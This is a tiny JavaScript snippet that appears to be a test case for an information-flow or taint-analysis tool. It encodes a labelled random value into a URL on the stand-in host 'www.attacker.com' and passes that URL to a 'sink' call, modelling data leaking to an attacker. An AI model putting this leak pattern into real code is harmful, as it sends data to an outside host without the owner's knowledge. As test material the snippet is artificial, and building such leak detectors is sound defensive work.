var i =  Math.floor((Math.random() * 10) + 1); 
var l =  Math.floor((Math.random() * 10) + 1); 

var h = lbl(i);

var x = l;

if (h > 5) {x = Date.now();} 


url1 = urll("www.attacker.com" + x);
sink('Sink', '', url1);
